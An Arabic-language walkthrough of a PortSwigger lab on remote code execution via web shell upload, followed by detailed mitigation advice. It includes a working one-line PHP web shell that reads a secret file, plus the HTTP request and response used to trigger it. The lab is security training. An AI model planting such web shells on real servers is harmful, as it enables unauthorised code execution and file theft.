# [Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

## **`الهدف`**
قم برفع ملف `PHP Web Shell` بسيط واستخدمه لاستخراج محتويات ملف `/home/carlos/secret` ثم قم بتقديمه كـ `Solutiom`.
## **`خطوات الحل`**
سنقوم بتسجيل الدخول إلى حساب `wiener:peter` بعد ذلك سنقوم بعمل ملف نصي على الجهاز باستخدام أى برنامج تحرير نصوص ونضع بداخله الكود التالي ونقوم بحفظه بصيغة `php` وأى اسم عشوائي مثل `TESTTEST`:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
بعد ذلك سنقوم برفعه باستخدام خاصية رفع الـ `Avatar` داخل اللاب
وبمجرد اتمام الرفع وعمل تجديد لصفحة `My account` سنجد في الـ `HTTP history` الطلب التالي والذي يستدعي الملف تلقائيًا:
```http
GET /files/avatars/TESTTEST.php HTTP/2
Host: 0aa7000103841427828b7a4100410058.web-security-academy.net
Cookie: session=SHQvmKGycLGoFHrZsSXblgk6VHYgopJE
```

وبفحص الاستجابة سنجد بداخلها الـ `Secret` المطلوب
```http
HTTP/2 200 OK
Date: Sun, 27 Sep 2026 17:35:39 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

IMT2Af2hcukhHxTGEkbqs3PQ5q1Zw8J6
```

بعد ذلك سنقوم بنسخه ثم نعود للصفحة الرئيسية للاب ونضغط على  `Submit solution` ونضعه في الحقل ونضغط `OK` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب استخدام القائمة البيضاء بالامتدادات الأمنة والسموحة فقط مثل: `.jpg, .png, .jpeg` وتجنب القوائم السوداء لأنه يسهل التحايل عليها.

ويجب إعداد سرفر الويب (مثل `Apache أو Nginx`) بحيث يُعامل أي ملف داخل مجلد المرفوعات كملف ثابت `Static Document` ولا يقوم بتشغيل أي محرك برمجي داخله.

ولا يجب الاعتماد على ترويسة `Content-Type` المرسلة في طلب الـ `HTTP` لأن المهاجم يتحكم بها بالكامل وبدلًا من ذلك يجب فحص التوقيع الرقمي للملف `Magic Bytes` من جهة السيرفر للتأكد من أن هيكل الملف هو فعلاً صورة وليس نصاً برمجياً.

ولا يجب حفظ الملفات بالاسم الذي أرسله المستخدم وبدلًأ من ذلك يجب برمجة النظام لتوليد اسم عشوائي وفريد (مثل `UUID` أو تجزئة `Hash` آمنة) والحاق الامتداد الصحيح الذي تم التحقق منه مسبقاً.

وكخطوة متقدمة، يمكن تمرير الصورة المرفوعة على مكتبة لمعالجة الصور لإنشاء نسخة جديدة من الصورة وحذف الملف الأصلي المرفوع.

ومن أفضل الحلول هو تخزين المرفوعات على سيرفر منفصل لا يمتلك أى بيئة لتنفيذ الأكواد، وإذا لم تتمكن من استخدام سيرفر منفصل، فيجب حفظ الملفات المرفوعة في مسار لا يمكن الوصول إليه مباشرة عبر المتصفح (مثلاً `/var/www/uploads` بدلاً من `/var/www/html/uploads`)، ويتم استدعاء الملفات برمجياً بصلاحيات محدودة.

ويجب تجريد البيانات الوصفية `Strip EXIF Data`، لأن المهاجمون غالباً ما يخبئون أكواد الـ `PHP` الخبيثة داخل بيانات الـ `EXIF` الخاصة بالصورة، لذلك مسح هذه البيانات يضيف طبقة أمان إضافية.

ويجب تمرير أي ملف يتم رفعه على برنامج مكافحة فيروسات قبل حفظه بشكل نهائي لاكتشاف الـ `Shells` المعروفة.

ويجب تقييد حجم الملف لمنع هجمات حجب الخدمة `DoS`.

ويجب تطبيق منهجية `Validate then Store` بحيث يستقبل السيرفر الملف المرفوع في الذاكرة `Memory` أو يحفظه في مسار مؤقت `Temporary Directory` خارج الـ `Web Root` بحيث تتم هناك  جميع الفحوصات (الامتداد، `Magic Bytes`، الحجم، الفيروسات) ومن ضمنها استخدام مكتبات مخصصة لتنظيف الـ `SVG` لحذف أي وسوم `<!DOCTYPE` أو `<!ENTITY` وإذا اجتاز جميع الفحوصات فقط، يتم نقله إلى المجلد النهائي المتاح للعامة.

وكطبقة حماية إضافية، يجب على السيرفر إرسال ترويسة سياسة أمان المحتوى `CSP` صارمة تمنع تنفيذ أكواد `JS` التي قد تُدمج داخل ملفات الـ `SVG` أو الصور.
